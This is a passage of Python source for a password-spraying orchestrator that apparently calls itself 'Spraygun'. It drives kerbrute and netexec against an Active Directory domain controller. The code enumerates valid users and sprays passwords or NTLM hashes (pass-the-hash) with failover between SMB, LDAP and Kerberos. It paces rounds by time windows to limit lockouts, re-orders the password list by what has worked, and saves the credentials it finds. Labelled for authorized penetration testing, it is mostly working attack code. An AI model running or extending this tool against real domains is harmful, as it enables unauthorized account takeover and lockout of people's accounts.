            if re.search(pat, line, re.IGNORECASE):
                # Try to extract username
                m = re.search(r"([A-Za-z0-9_\-\.\\]+)\\([A-Za-z0-9_\-\.@]+)", line)
                if m:
                    return (LineType.LOCKOUT, m.group(2))
                else:
                    return (LineType.LOCKOUT, None)
        # Connection error (for failover counting)
        for pat in NXC_CONN_ERROR_PATTERNS:
            if re.search(pat, line, re.IGNORECASE):
                return (LineType.CONN_ERROR, None)
        # Auth failure
        for pat in NXC_AUTHFAIL_PATTERNS:
            if re.search(pat, line, re.IGNORECASE):
                # Try to extract username for cred-reuse tracking
                m = re.search(r"([A-Za-z0-9_\-\.\\]+)\\([A-Za-z0-9_\-\.@]+)", line)
                if m:
                    return (LineType.AUTHFAIL, m.group(2))  # Return username
                return (LineType.AUTHFAIL, None)

    elif engine.tool == "kerbrute":
        # Check for realm/domain errors FIRST (highest priority)
        for pat in KERBRUTE_ERROR_PATTERNS:
            if re.search(pat, line, re.IGNORECASE):
                return (LineType.ERROR, line)
        # Success
        for pat in KERBRUTE_SUCCESS_PATTERNS:
            if re.search(pat, line):
                # Extract user@domain:password
                m = re.search(r"([A-Za-z0-9_\-\.@]+):(\S+)", line)
                if m:
                    user, secret = m.groups()
                    return (LineType.SUCCESS, f"{user}:{secret}")
        # Lockout (best-effort)
        for pat in KERBRUTE_LOCKOUT_PATTERNS:
            if re.search(pat, line, re.IGNORECASE):
                m = re.search(r"([A-Za-z0-9_\-\.@]+)", line)
                if m:
                    return (LineType.LOCKOUT, m.group(1))
                else:
                    return (LineType.LOCKOUT, None)
        # Connection error
        for pat in KERBRUTE_CONN_ERROR_PATTERNS:
            if re.search(pat, line, re.IGNORECASE):
                return (LineType.CONN_ERROR, None)
        # Auth failure
        for pat in KERBRUTE_AUTHFAIL_PATTERNS:
            if re.search(pat, line, re.IGNORECASE):
                return (LineType.AUTHFAIL, None)

    return (LineType.INFO, None)

def spray_one_password(engine: Engine, cfg: Config, secret: str, ui: RichUI, state: State) -> RoundResult:
    """
    Run one engine invocation for one password/hash. Stream stdout line-by-line,
    classify, update UI/state, and return RoundResult.
    Connection errors are tracked but don't abort the engine (failover chain handles it).

    Feature 1 (credential-reuse matrix): Uses a filtered userlist per password.
    """
    result = RoundResult()

    # Build filtered userlist for this password (skip already-attempted users)
    userlist_path, user_count = state.build_userlist_for(secret)

    if user_count == 0:
        # All users already attempted for this password
        ui.console.print(f"[*] All {len(cfg.users)} users already attempted for this password; skipping", style="dim")
        result.clean_finish = True
        return result

    ui.console.print(f"[*] Spraying {user_count} users (skipping {len(cfg.users) - user_count} already attempted)", style="dim")

    # Store original cfg.userfile and restore after
    original_userfile = cfg.userfile
    cfg.userfile = userlist_path

    try:
        result = _spray_one_password_impl(engine, cfg, secret, ui, state, userlist_path)

        # Feature 1: For kerbrute, mark all users as attempted on clean finish
        # (kerbrute doesn't emit per-user lines for failures)
        if result.clean_finish and engine.tool == "kerbrute":
            remaining_users = [u for u in cfg.users if u not in state.attempted_matrix.get(secret, set())]
            state.mark_attempted_batch(secret, remaining_users)

    finally:
        # Restore original userfile
        cfg.userfile = original_userfile

    return result


def _spray_one_password_impl(engine: Engine, cfg: Config, secret: str, ui: RichUI, state: State, userlist_path: str) -> RoundResult:
    """
    Internal implementation of spray_one_password after userlist filtering.
    Connection errors are tracked but don't abort (failover chain handles it).
    """
    result = RoundResult()

    if cfg.dry_run:
        # Simulate tool output for --dry-run mode
        ui.feed_line(f"[DRY-RUN] Simulating {engine} with secret=***")

        # For cred-reuse tracking, mark all users in the filtered list as attempted
        with open(userlist_path, "r") as f:
            dry_run_users = [line.strip() for line in f if line.strip()]

        for user in dry_run_users:
            state.mark_attempted(secret, user)

        # Simulate some fake lines based on round
        for i in range(5):
            fake_line = f"[{i}] [DRY-RUN] fake output line {i}"
            ui.feed_line(fake_line)
            line_type, data = classify_line(engine, fake_line)
            if line_type == LineType.SUCCESS:
                pass  # Not real
            elif line_type == LineType.LOCKOUT:
                pass
            elif line_type == LineType.CONN_ERROR:
                result.conn_fails += 1
                ui.increment_conn_fails()
                # Don't abort on conn-fail-limit in dry-run either
            time.sleep(0.1)

        result.clean_finish = not result.aborted
        return result

    # Build command
    cmd: List[str] = []

    if engine.tool == "nxc":
        binary = cfg.nxc_binary
        if not binary:
            ui.console.print("[!] nxc binary not found. Install netexec or override with --nxc-path", style="red")
            result.aborted = True
            result.abort_reason = "binary-not-found"
            return result

        cmd = [binary]

        if engine.protocol == "smb":
            cmd.extend(["smb", cfg.dc_ip])
        elif engine.protocol == "ldap":
            cmd.extend(["ldap", cfg.dc_ip, "-d", cfg.domain])
        else:
            ui.console.print(f"[!] Invalid nxc protocol: {engine.protocol}", style="red")
            result.aborted = True
            result.abort_reason = "invalid-protocol"
            return result

        cmd.extend(["-u", userlist_path, "-H" if cfg.pth_mode else "-p", secret])
        cmd.append("--continue-on-success")

    elif engine.tool == "kerbrute":
        if cfg.pth_mode:
            ui.console.print("[!] PTH mode not supported with kerbrute; this should never happen in PTH failover chain", style="red")
            result.aborted = True
            result.abort_reason = "pth-kerbrute-incompatible"
            return result

        binary = cfg.kerbrute_binary
        if not binary:
            ui.console.print("[!] kerbrute binary not found. Install kerbrute or override with --kerbrute-path", style="red")
            result.aborted = True
            result.abort_reason = "binary-not-found"
            return result

        cmd = [binary, "passwordspray", "--dc", cfg.dc_ip, "-d", cfg.domain, userlist_path, secret]

    else:
        ui.console.print(f"[!] Unknown engine tool: {engine.tool}", style="red")
        result.aborted = True
        result.abort_reason = "unknown-engine"
        return result

    # Spawn subprocess
    ui.console.print(f"[*] Running: {' '.join(cmd[:3])}... (secret masked)", style="dim")

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )

        # Stream output
        for line in proc.stdout:
            line = line.rstrip()
            if not line:
                continue

            # Log to overall log with timestamp
            ts = datetime.datetime.now().isoformat()
            state._log_line(f"{ts}  {line}")

            # Update UI raw feed
            ui.feed_line(line)

            # Classify
            line_type, data = classify_line(engine, line)

            if line_type == LineType.SUCCESS and data:
                user, secret_hit = data.split(":", 1)
                result.successes.append((user, secret_hit))
                ui.update_success(user, secret_hit)
                state.add_cred(user, secret_hit, is_admin=False)
                state.mark_attempted(secret, user)  # Feature 1: Track attempted pair

            elif line_type == LineType.ADMIN and data:
                user, secret_hit = data.split(":", 1)
                result.admin_users.append((user, secret_hit))
                # Also add to successes since it's a valid credential
                result.successes.append((user, secret_hit))
                ui.update_admin(user, secret_hit)
                state.add_cred(user, secret_hit, is_admin=True)
                state.mark_attempted(secret, user)  # Feature 1: Track attempted pair

            elif line_type == LineType.LOCKOUT:
                user_lock = data if data else "(unknown)"
                result.lockouts.add(user_lock)
                ui.update_lockout(user_lock)
                state.add_lockout(user_lock)
                if user_lock != "(unknown)":
                    state.mark_attempted(secret, user_lock)  # Feature 1: Track attempted pair

            elif line_type == LineType.ERROR:
                # Tool-level error (wrong realm, domain mismatch, etc.)
                error_msg = data if data else line
                result.errors.append(error_msg)
                ui.update_error(error_msg)
                ui.console.print(f"[!] Tool error: {error_msg}", style="red")

                # If we get critical errors, abort this engine immediately
                if any(kw in error_msg.lower() for kw in ["wrong realm", "cannot find kdc", "no kdc", "unknown realm"]):
                    proc.terminate()
                    try:
                        proc.wait(timeout=2)
                    except subprocess.TimeoutExpired:
                        proc.kill()
                    result.aborted = True
                    result.abort_reason = "tool-error"
                    break

            elif line_type == LineType.AUTHFAIL:
                # Track attempted user for cred-reuse matrix (Feature 1)
                if data:
                    state.mark_attempted(secret, data)

            elif line_type == LineType.CONN_ERROR:
                # Track connection errors for stats/throttling, but don't abort
                # Individual engines may have issues (e.g., kerbrute KDC errors)
                # As long as one engine in the failover chain works, we continue
                result.conn_fails += 1
                ui.increment_conn_fails()
                # No longer abort on conn-fail-limit - let failover chain handle it

        # Wait for normal completion if not aborted
        if not result.aborted:
            return_code = proc.wait(timeout=10)
            result.clean_finish = (return_code == 0)

    except FileNotFoundError:
        ui.console.print(f"[!] Command not found: {cmd[0]}", style="red")
        result.aborted = True
        result.abort_reason = "command-not-found"

    except subprocess.TimeoutExpired:
        ui.console.print("[!] Subprocess timed out", style="red")
        result.aborted = True
        result.abort_reason = "timeout"

    except Exception as e:
        ui.console.print(f"[!] Exception running engine: {e}", style="red")
        result.aborted = True
        result.abort_reason = f"exception-{type(e).__name__}"

    return result

# =============================================================================
# Preflight check
# =============================================================================

def preflight(cfg: Config, ui: RichUI) -> Tuple[bool, str]:
    """
    Perform preflight: reachability + domain validation.
    Returns (ok, detail_message).
    """
    if cfg.no_preflight or cfg.dry_run:
        return True, "Preflight skipped (--no-preflight or --dry-run)"

    ui.console.print("[*] Preflight check...", style="cyan")

    # 1. Reachability: socket connect to relevant ports
    ports_to_check = []
    if cfg.tool == "nxc":
        if cfg.protocol == "smb":
            ports_to_check = [445, 88]  # SMB + Kerberos
        elif cfg.protocol == "ldap":
            ports_to_check = [389, 636, 88]  # LDAP/LDAPS + Kerberos
    elif cfg.tool == "kerbrute":
        ports_to_check = [88]  # Kerberos

    reachable = False
    for port in ports_to_check:
        try:
            sock = socket.create_connection((cfg.dc_ip, port), timeout=3)
            sock.close()
            ui.console.print(f"  [+] Port {port} reachable", style="green")
            reachable = True
            break
        except (socket.timeout, ConnectionRefusedError, OSError):
            ui.console.print(f"  [-] Port {port} not reachable", style="dim")

    if not reachable:
        msg = f"DC {cfg.dc_ip} unreachable on ports {ports_to_check}"
        ui.alert("Preflight Failed", msg, "red")
        return False, msg

    # 2. Domain check: nxc probe (or kerbrute fallback)
    if cfg.nxc_binary:
        try:
            cmd = [cfg.nxc_binary]
            if cfg.protocol == "smb":
                cmd.extend(["smb", cfg.dc_ip])
            else:
                cmd.extend(["ldap", cfg.dc_ip, "-d", cfg.domain])

            # Quick probe without creds
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)

            # Parse domain from output
            output = result.stdout + result.stderr
            # nxc reports domain/NetBIOS in various formats; do a fuzzy check
            domain_upper = cfg.domain.upper()
            if domain_upper in output.upper():
                ui.console.print(f"  [+] Domain '{cfg.domain}' confirmed in DC response", style="green")
                return True, "Preflight passed"
            else:
                msg = f"Domain '{cfg.domain}' not found in DC response (possible mismatch)"
                ui.console.print(f"  [-] {msg}", style="yellow")
                ui.console.print(f"     (DC may be reporting a different domain/NetBIOS name)", style="dim")
                ui.alert("Preflight Warning", msg + ". Continue at your own risk.", "yellow")
                return True, "Preflight passed with warning"  # Allow proceeding with a warning

        except subprocess.TimeoutExpired:
            msg = "nxc probe timed out"
            ui.console.print(f"  [-] {msg}", style="yellow")
            return True, "Preflight passed with warning"  # Continue
        except Exception as e:
            ui.console.print(f"  [-] nxc probe error: {e}", style="dim")
            # Fallback to just reachability check which already passed

    # Fallback for kerbrute-only: we already checked port 88, consider that enough
    ui.console.print("  [+] Preflight complete (reachability verified)", style="green")
    return True, "Preflight passed"

# =============================================================================
# Feature 2: Filter disabled/non-existent accounts
# =============================================================================

def enumerate_valid_users(cfg: Config, ui: RichUI, console: Console) -> List[str]:
    """
    Run kerbrute userenum to filter out non-existent accounts.
    Returns list of valid users (falls back to full list on error).
    """
    if not cfg.kerbrute_binary:
        console.print("[!] kerbrute binary not found; skipping user filtering", style="yellow")
        return cfg.users

    console.print("[*] Enumerating valid users with kerbrute userenum...", style="cyan")

    cmd = [cfg.kerbrute_binary, "userenum", "--dc", cfg.dc_ip, "-d", cfg.domain, cfg.userfile]

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )

        valid_users = set()
        for line in proc.stdout:
            line = line.rstrip()
            if not line:
                continue

            # kerbrute userenum format: [+] VALID USERNAME: user@domain
            if "[+] VALID USERNAME:" in line:
                m = re.search(r"[+] VALID USERNAME:\s+(\S+)", line)
                if m:
                    username_full = m.group(1)
                    # Extract username before @
                    username = username_full.split("@")[0]
                    valid_users.add(username)

        return_code = proc.wait(timeout=10)

        if return_code == 0 and valid_users:
            console.print(f"    [+] Found {len(valid_users)} valid users", style="green")
            return sorted(valid_users)
        else:
            console.print("    [-] kerbrute userenum failed or returned no results", style="yellow")
            console.print("    [*] Falling back to full user list", style="dim")
            return cfg.users

    except Exception as e:
        console.print(f"    [-] Error running kerbrute userenum: {e}", style="yellow")
        console.print("    [*] Falling back to full user list", style="dim")
        return cfg.users

# =============================================================================
# Feature B: Spray window scheduling
# =============================================================================

class SprayWindow:
    """Spray time window: business-hours, off-hours, or custom range."""

    def __init__(self, spec: str):
        """Parse preset or 'HH:MM-HH:MM' range."""
        self.spec = spec.lower()
        self.start_minute = None  # minutes since midnight
        self.end_minute = None
        self.days = set()  # 0=Mon,...,6=Sun; empty=all days

        if self.spec == "business-hours":
            # Mon-Fri 09:00-17:00
            self.start_minute = 9 * 60
            self.end_minute = 17 * 60
            self.days = {0, 1, 2, 3, 4}  # Mon-Fri
        elif self.spec == "off-hours":
            # Mon-Fri 17:00-09:00 (overnight) + all weekend
            self.start_minute = 17 * 60
            self.end_minute = 9 * 60
            self.days = {0, 1, 2, 3, 4}  # Active Mon-Fri (wraparound overnight)
            # Weekend handling in is_in_window (all Sat/Sun are in window)
        else:
            # Custom "HH:MM-HH:MM" or "H-H"
            self._parse_range()

    def _parse_range(self):
        """Parse custom range like '09:00-17:00' or '9-17'."""
        try:
            parts = self.spec.split("-")
            if len(parts) != 2:
                raise ValueError("Invalid range format")

            def parse_minutes(t):
                if ":" in t:
                    h, m = t.split(":")
                    return int(h) * 60 + int(m)
                else:
                    return int(t) * 60

            self.start_minute = parse_minutes(parts[0])
            self.end_minute = parse_minutes(parts[1])
        except Exception:
            # Default to unrestricted if parse fails
            self.start_minute = 0
            self.end_minute = 24 * 60

    def is_in_window(self, now: Optional[datetime.datetime] = None) -> bool:
        """Check if current time is within the spray window."""
        if now is None:
            now = datetime.datetime.now()

        weekday = now.weekday()  # 0=Mon,...,6=Sun
        minute = now.hour * 60 + now.minute

        # off-hours special case: all weekend is in window
        if self.spec == "off-hours":
            if weekday in {5, 6}:  # Sat/Sun
                return True
            # Weekday: in window if 17:00-09:00 (overnight wrap)
            if minute >= self.start_minute or minute < self.end_minute:
                return True
            return False

        # Check day restriction
        if self.days and weekday not in self.days:
            return False

        # Normal range check
        if self.start_minute <= self.end_minute:
            # Non-wrapping: 09:00-17:00
            return self.start_minute <= minute < self.end_minute
        else:
            # Wrapping: 22:00-06:00
            return minute >= self.start_minute or minute < self.end_minute

    def seconds_until_open(self, now: Optional[datetime.datetime] = None) -> int:
        """Seconds until next window opening (0 if inside)."""
        if now is None:
            now = datetime.datetime.now()

        if self.is_in_window(now):
            return 0

        # Compute next opening time
        if self.spec == "business-hours":
            # Next Mon-Fri 09:00
            candidate = now.replace(hour=9, minute=0, second=0, microsecond=0)
            while candidate.weekday() not in self.days or candidate <= now:
                candidate += datetime.timedelta(days=1)
            return int((candidate - now).total_seconds())

        elif self.spec == "off-hours":
            # If weekday during business hours, next opening is today 17:00
            # If weekday outside business hours or weekend, already in window
            if now.weekday() in self.days and 9 * 60 <= now.hour * 60 + now.minute < 17 * 60:
                candidate = now.replace(hour=17, minute=0, second=0, microsecond=0)
                return int((candidate - now).total_seconds())
            return 0

        else:
            # Custom range
            candidate = now.replace(hour=self.start_minute // 60,
                                    minute=self.start_minute % 60,
                                    second=0, microsecond=0)
            while (candidate.weekday() in self.days and self.days and
                   candidate <= now):
                candidate += datetime.timedelta(days=1)
            return int((candidate - now).total_seconds())

    def describe(self) -> str:
        """Human-readable window description."""
        if self.spec == "business-hours":
            return "Mon-Fri 09:00-17:00"
        elif self.spec == "off-hours":
            return "Mon-Fri 17:00-09:00 + all weekend"
        else:
            return self.spec


def wait_for_window(window: SprayWindow, ui: RichUI, console: Console, state: State):
    """Wait until spray window opens (if outside). Records timeline event."""
    if window.is_in_window():
        return

    seconds = window.seconds_until_open()
    if seconds <= 0:
        return

    console.print(f"[*] Outside spray window ({window.describe()}); waiting until next window opens...", style="cyan")

    # Record timeline event
    open_time = datetime.datetime.now() + datetime.timedelta(seconds=seconds)
    state.record_timeline_event("schedule_wait", f"Waiting {int(seconds//60)}m until {open_time.strftime('%H:%M')}")

    ui.countdown(seconds)

# =============================================================================
# Failover chain building
# =============================================================================

def build_failover_chain(cfg: Config) -> List[Engine]:
    """
    Build ordered, de-duplicated list of engines for failover.
    See plan: depends on starting tool + PTH mode.
    """
    if cfg.pth_mode:
        # PTH: nxc only, exclude kerbrute
        start_proto = cfg.protocol  # "smb" or "ldap"
        other_proto = "ldap" if start_proto == "smb" else "smb"
        return [
            Engine("nxc", start_proto),
            Engine("nxc", other_proto),
        ]

    # Normal mode
    chain = []

    if cfg.tool == "nxc":
        if cfg.protocol == "smb":
            chain = [
                Engine("nxc", "smb"),
                Engine("kerbrute"),
                Engine("nxc", "ldap"),
            ]
        elif cfg.protocol == "ldap":
            chain = [
                Engine("nxc", "ldap"),
                Engine("kerbrute"),
                Engine("nxc", "smb"),
            ]

    elif cfg.tool == "kerbrute":
        chain = [
            Engine("kerbrute"),
            Engine("nxc", "ldap"),
            Engine("nxc", "smb"),
        ]

    # De-duplicate (in case user passes weird combos)
    seen = set()
    unique_chain = []
    for eng in chain:
        key = (eng.tool, eng.protocol)
        if key not in seen:
            seen.add(key)
            unique_chain.append(eng)

    return unique_chain

# =============================================================================
# Lockout handling
# =============================================================================

def handle_lockouts(round_lockouts: int, cumulative_lockouts: int, cfg: Config, ui: RichUI, console: Console) -> bool:
    """
    Apply lockout rules. Returns True if run should continue, False if hard-stop.
    - Burst rule: >= cfg.lockout_burst in one round → hard-stop.
    - Threshold rule: >= cfg.lockout_threshold cumulative → interactive prompt.
    """
    if round_lockouts >= cfg.lockout_burst:
        msg = f"[!] Hard-stop: {round_lockouts} lockouts in this round (burst threshold {cfg.lockout_burst}). Stopping the run to avoid mass lockout."
        console.print(msg, style="red")
        ui.alert("LOCKOUT BURST - STOPPED", msg, "red")
        return False  # Do not continue

    if cumulative_lockouts >= cfg.lockout_threshold:
        msg = f"[*] Cumulative lockouts: {cumulative_lockouts} (threshold {cfg.lockout_threshold})."
        console.print(msg, style="yellow")
        return prompt_continue(ui, console)

    return True

def prompt_continue(ui: RichUI, console: Console) -> bool:
    """Interactive prompt: continue (c) or quit (q). Returns True to continue."""
    ui.alert("PAUSED", "Lockout threshold reached. Press 'c' to continue or 'q' to quit.", "yellow")

    while True:
        try:
            choice = input("Continue? [c/q]: ").strip().lower()
            if choice in ("c", "continue"):
                console.print("[*] Continuing...", style="green")
                return True
            elif choice in ("q", "quit", "exit"):
                console.print("[*] Quitting.", style="red")
                return False
            else:
                console.print("  Enter 'c' to continue or 'q' to quit.", style="dim")
        except (EOFError, KeyboardInterrupt):
            console.print("\n[*] Interrupted; quitting.", style="red")
            return False

# =============================================================================
# Signal handling
# =============================================================================

def setup_signal_handler(state: State, console: Console):
    """Register SIGINT handler to persist state on Ctrl-C."""
    def handler(signum, frame):
        console.print("\n[*] Interrupted. Saving state...", style="yellow")
        state.save()
        console.print("[*] State saved. You can resume with --resume.", style="green")
        sys.exit(130)  # Standard exit code for SIGINT

    signal.signal(signal.SIGINT, handler)

# =============================================================================
# Main run loop
# =============================================================================

def run(cfg: Config, console: Console):
    """Main spray loop."""
    ui = RichUI(console, max_feed_lines=cfg.feed_lines)

    # Preflight
    ok, detail = preflight(cfg, ui)
    if not ok:
        console.print(f"[!] Preflight failed: {detail}", style="red")
        console.print("[!] Aborting. Fix the issue or use --no-preflight to bypass (not recommended).", style="yellow")
        return

    # Feature 2: Filter disabled/non-existent accounts if requested
    if cfg.filter_disabled and not cfg.dry_run:
        original_count = len(cfg.users)
        cfg.users = enumerate_valid_users(cfg, ui, console)
        filtered_count = len(cfg.users)
        dropped = original_count - filtered_count

        # Write filtered list to log dir
        active_users_file = Path(cfg.log_dir) / "active-users.txt"
        active_users_file.write_text("\n".join(cfg.users) + "\n")

        console.print(f"[*] Filtered: {filtered_count} valid of {original_count} total ({dropped} non-existent dropped)", style="green")
        console.print(f"[*] Active users saved to: {active_users_file}", style="cyan")

    # Initialize state
    state = State(cfg.log_dir, cfg)

    # Setup signal handler for Ctrl-C
    setup_signal_handler(state, console)

    # Build failover chain
    chain = build_failover_chain(cfg)
    console.print(f"[*] Failover chain: {' -> '.join(str(e) for e in chain)}", style="cyan")

    # Main loop over password queue
    round_idx = 0
    cumulative_lockouts = len(state.locked_users)

    while state.remaining_queue:
        # Take next batch
        batch = state.remaining_queue[:cfg.passwords_per_round]
        state.remaining_queue = state.remaining_queue[cfg.passwords_per_round:]

        console.print(f"\n[*] Round {round_idx + 1}: spraying {len(batch)} secret(s)", style="cyan")

        # Feature E: Record round start timeline event
        state.record_timeline_event("round_start", "", round_idx=round_idx + 1)

        # Build batch info string to show what's being sprayed
        passwords_to_spray = batch.copy()
        next_passwords_preview = state.remaining_queue[:cfg.passwords_per_round]

        round_lockouts_this_round = 0
        round_conn_fails_this_round = 0  # Feature D: Track conn fails per round
        round_errors_this_round = []  # Track all errors in this round
        round_successes_this_round = []  # Track all successes in this round

        for secret in batch:
            # Try each engine in failover chain
            engine_success = False
            for engine in chain:
                # Build batch info string
                batch_info = f"Spraying {len(passwords_to_spray)} passwords (this round)"
                if len(passwords_to_spray) > 1:
                    batch_info += f": {passwords_to_spray[0][:20]}... ({len(passwords_to_spray)} total)"
                else:
                    batch_info += f": {passwords_to_spray[0][:30]}"

                # Start spray UI
                ui.start_spray(engine, secret, round_idx + 1, batch_info)
                state.record_spray_start(engine, secret, round_idx + 1)

                # Run spray
                result = spray_one_password(engine, cfg, secret, ui, state)

                # Record stats
                round_lockouts_this_round += len(result.lockouts)
                round_conn_fails_this_round += result.conn_fails  # Feature D: Accumulate conn fails
                round_errors_this_round.extend(result.errors)  # Track errors
                round_successes_this_round.extend(result.successes)  # Track successes
                state.record_spray_end(
                    len(result.successes),
                    len(result.lockouts),
                    result.conn_fails,
                    result.aborted,
                    result.abort_reason,
                    len(result.errors)  # Add error count to log
                )

                ui.end_spray()

                # If engine aborted (tool-error, timeout, exception, binary-not-found), try next
                # Note: We no longer abort on conn-fail-limit; connection errors are tracked but don't stop the engine
                if result.aborted:
                    console.print(f"[-] {engine} aborted: {result.abort_reason}; trying next in chain...", style="yellow")
                    continue  # Try next engine

                # Engine finished cleanly (or with partial results but no abort); move to next secret
                engine_success = True
                break  # Don't continue failover chain for this secret

            if not engine_success:
                # All engines in the failover chain aborted - only pause for this condition
                # (Connection errors during individual engine runs are tracked but don't pause)
                console.print(f"[!] All engines failed for this secret. Pausing.", style="red")
                ui.alert("ALL ENGINES FAILED", "Could not spray this secret with any tool in the failover chain. Check network/DC. Press Enter to retry or Ctrl-C to abort.", "red")
                input()  # Pause for operator

            # Remove this password from the "to spray" list
            if passwords_to_spray and passwords_to_spray[0] == secret:
                passwords_to_spray.pop(0)

        # Mark secrets as used
        for secret in batch:
            state.mark_used(secret)

        # Feature 3: Pattern learning - re-prioritize queue based on successful patterns
        boosted = state.reprioritize_queue()
        if boosted > 0:
            # Get top successful patterns
            top_patterns = sorted(state.success_by_pattern.items(), key=lambda x: x[1], reverse=True)[:3]
            pattern_names = [pat for pat, _ in top_patterns]
            console.print(f"[*] Re-prioritizing: boosting {boosted} password(s) matching successful pattern(s): {', '.join(pattern_names)}", style="cyan")
            # Feature E: Record reprioritize timeline event
            state.record_timeline_event("reprioritize", f"boosted {boosted} passwords", round_idx=round_idx + 1)

        # Show round summary
        console.print(f"[*] Round {round_idx + 1} complete:", style="cyan")
        console.print(f"    - Lockouts: {round_lockouts_this_round}", style="yellow" if round_lockouts_this_round > 0 else "dim")
        console.print(f"    - Found credentials: {len(round_successes_this_round)}", style="green" if round_successes_this_round else "dim")

        # Feature 4: Show compact stats line
        console.print(f"    - {state.get_compact_stats()}", style="cyan")

        # Show last password sprayed and next passwords to spray
        if batch:
            last_pw = batch[-1]
            console.print(f"    - Last password sprayed: {last_pw}", style="cyan")
        else:
            console.print(f"    - Last password sprayed: (none)", style="dim")

        if next_passwords_preview:
            next_list_str = ", ".join(next_passwords_preview)
            console.print(f"    - Next password(s) to spray: {next_list_str}", style="cyan")
        elif state.remaining_queue:
            # There are more passwords but less than a full batch
            console.print(f"    - Next password(s) to spray: {', '.join(state.remaining_queue)}", style="cyan")
        else:
            console.print(f"    - Next password(s) to spray: <end of file>", style="dim")

        # Show error messages if any
        if round_errors_this_round:
            console.print(f"    - Errors: {len(round_errors_this_round)}", style="red")
            console.print("      Error messages:", style="red")
            for err in round_errors_this_round[:5]:  # Show first 5 errors
                console.print(f"        - {err}", style="dim")

        # Show connection errors (informational - doesn't pause unless all engines fail)
        if round_conn_fails_this_round > 0:
            console.print(f"    - Connection errors: {round_conn_fails_this_round} (informational - some engines may have issues but at least one succeeded)", style="cyan")

        # Handle lockouts
        cumulative_lockouts = len(state.locked_users)
        should_continue = handle_lockouts(round_lockouts_this_round, cumulative_lockouts, cfg, ui, console)

        if not should_continue:
            console.print("[*] Run stopped due to lockout threshold.", style="yellow")
            break

        # Check for critical errors that should prevent countdown
        critical_errors = [e for e in round_errors_this_round if any(kw in e.lower() for kw in ["wrong realm", "cannot find kdc", "no kdc", "unknown realm"])]
        if critical_errors:
            console.print("[!] Critical tool errors detected (wrong realm/domain). Pausing before countdown.", style="red")
            ui.alert("CRITICAL ERRORS", "Tool reported domain/realm errors. Check your -d domain parameter. Press Enter to continue or Ctrl-C to abort.", "red")
            input()  # Pause for operator

        # Feature D: Update throttle based on this round's conn fails
        throttle_mult = state.update_throttle(round_conn_fails_this_round)
        if throttle_mult > 1.0:
            console.print(f"    [*] Throttling: {throttle_mult:.1f}x inter-round delay (DC stress detected)", style="yellow")
            # Feature E: Record throttle timeline event
            state.record_timeline_event("throttle", f"multiplier now {throttle_mult:.1f}x", round_idx=round_idx + 1)

        # Countdown if more passwords remain
        if state.remaining_queue:
            # Feature B: Spray window scheduling - wait if outside window
            if cfg.schedule:
                window = SprayWindow(cfg.schedule)
                wait_for_window(window, ui, console, state)

            # Feature D: Apply throttle multiplier to delay
            effective_delay = int(cfg.time_between_rounds * state.delay_multiplier)
            console.print(f"[*] Sleeping {effective_delay} minutes until next round...", style="cyan")
            ui.countdown(effective_delay * 60)

        # Feature E: Record round end timeline event
        state.record_timeline_event("round_end", f"round {round_idx + 1} complete", round_idx=round_idx + 1)

        round_idx += 1

    # Done
    console.print("\n[+] Spray complete.", style="green")
    console.print(f"[+] Found credentials: {len(state.found_creds)}", style="green")
    console.print(f"[+] Total lockouts: {len(state.locked_users)}", style="yellow")

    # Feature E: Record complete timeline event
    state.record_timeline_event("complete", "spray finished")

    # Feature 4: Show full stats dashboard
    console.print("\n")
    console.print(state.render_stats(console))

    # Feature 5: Export results (always export at end for audit trail)
    console.print(f"\n[*] Exporting results...", style="cyan")

    # Export timeline.json (always)
    timeline_json = state.log_dir / "timeline.json"
    timeline_json.write_text(json.dumps(state.timeline_events, indent=2))
    console.print(f"[+] Timeline exported to: {timeline_json}", style="cyan")

    # Export HTML timeline if --timeline set
    if cfg.timeline or cfg.export == "all":
        timeline_html = state.log_dir / "spray-timeline.html"
        timeline_html.write_text(state.render_timeline_html())
        console.print(f"[+] Timeline HTML exported to: {timeline_html}", style="cyan")

    state.export_results("json")
    state.export_results("csv")
    console.print(f"[+] Results exported to: {state.log_dir}/results.json and results.csv", style="green")

    console.print(f"[+] Credentials saved to: {state.creds_file}", style="cyan")
    console.print(f"[+] Lockouts saved to: {state.lockouts_file}", style="cyan")
    console.print(f"[+] Overall log: {state.overall_log}", style="cyan")

# =============================================================================
# CLI entrypoint
# =============================================================================

def main():
    console = Console()

    parser = argparse.ArgumentParser(
        prog="spraygun.py",
        description="Spraygun — resilient password-spray orchestrator (authorized pentesting only)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Plaintext password spray, kerbrute default
  python3 spraygun.py -u users.txt -p passwords.txt -d LAB -dc-ip 10.10.10.10 -t 35 --limit 2

  # nxc SMB mode with custom timing
  python3 spraygun.py -u users.txt -p passwords.txt -d LAB -dc-ip 10.10.10.10 --tool nxc --protocol smb -t 30 --limit 1

  # Pass-the-hash mode (NTLM hashes)
  python3 spraygun.py -u users.txt -p hashes.txt -d LAB -dc-ip 10.10.10.10 --pth --tool nxc --protocol smb

  # Dry-run to verify UI/failover without a target
  python3 spraygun.py -u users.txt -p passwords.txt -d LAB -dc-ip 10.10.10.10 --dry-run

  # Resume from a canceled run
  python3 spraygun.py -u users.txt -p passwords.txt -d LAB -dc-ip 10.10.10.10 --resume

For authorized penetration testing only.
        """
    )

    parser.add_argument("-u", help="Userlist file (one per line)", required=True)
    parser.add_argument("-p", help="Password/hash file (one per line)", required=True)
    parser.add_argument("-d", help="Domain", required=True)
    parser.add_argument("-dc-ip", help="Domain Controller IP", required=True)

    parser.add_argument("--tool", choices=["kerbrute", "nxc"], default="kerbrute", help="Spray engine (default: kerbrute)")
    parser.add_argument("--protocol", choices=["smb", "ldap"], default="ldap", help="Protocol for nxc (default: ldap; ignored for kerbrute)")

    parser.add_argument("-t", type=int, default=35, help="Minutes between spray rounds (default: 35)")
    parser.add_argument("--limit", type=int, default=2, dest="passwords_per_round", help="Passwords per round (default: 2)")

    parser.add_argument("--pth", action="store_true", help="Pass-the-hash mode: -p file contains NTLM hashes, forces nxc, excludes kerbrute")

    parser.add_argument("--lockout-threshold", type=int, default=2, help="Cumulative lockouts before interactive prompt (default: 2)")
    parser.add_argument("--lockout-burst", type=int, default=5, help="Lockouts in a single round that hard-stop the run (default: 5)")
